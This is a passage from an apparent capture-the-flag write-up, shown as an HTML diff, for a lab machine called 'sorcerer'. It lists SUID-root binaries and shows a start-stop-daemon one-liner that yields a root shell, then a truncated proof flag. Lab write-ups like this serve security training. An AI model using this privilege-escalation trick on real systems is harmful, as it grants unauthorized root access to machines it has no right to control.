+   166426     16 -rwsr-xr-x   1 root     root        14664 Oct  9  2019 /usr/bin/vmware-user-suid-wrapper
+   134605     44 -rwsr-xr-x   1 root     root        44440 Jul 27  2018 /usr/bin/newgrp
+   131134     56 -rwsr-xr-x   1 root     root        54096 Jul 27  2018 /usr/bin/chfn
+   135088     36 -rwsr-xr-x   1 root     root        34888 Jan 10  2019 /usr/bin/umount
+   131137     84 -rwsr-xr-x   1 root     root        84016 Jul 27  2018 /usr/bin/gpasswd
+   131135     44 -rwsr-xr-x   1 root     root        44528 Jul 27  2018 /usr/bin/chsh
+      938     12 -rwsr-xr-x   1 root     root        10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+   152206    428 -rwsr-xr-x   1 root     root       436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
+   148810     52 -rwsr-xr--   1 root     messagebus    51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</code></pre>
+<p><code>GTFObins</code> confirms it could be an attack vector for privesc.</p>
+<p><img alt="image-20260128232001510" src="./sorcerer.assets/image-20260128232001510.png" /></p>
+<h1 id="shell-as-root">Shell as <code>root</code></h1>
+<p>Take a look at the <code>euid</code> , I’m root!</p>
+<pre><code class="language-bash">max@sorcerer:/tmp$ /usr/sbin/start-stop-daemon -n $RANDOM -S -x /bin/bash -- -p
+bash-5.0# whoami
+root
+bash-5.0# id
+uid=1003(max) gid=1003(max) euid=0(root) groups=1003(max)
+</code></pre>
+<p>Found <code>proof.txt</code></p>
+<pre><code class="language-bash">bash-5.0# ls
+proof.txt
+bash-5.0# cat proof.txt
+4cfd5...
+</code></pre>
+<footer>&copy; 2026 wook413.</footer>
+</div>
 </body>
 </html>
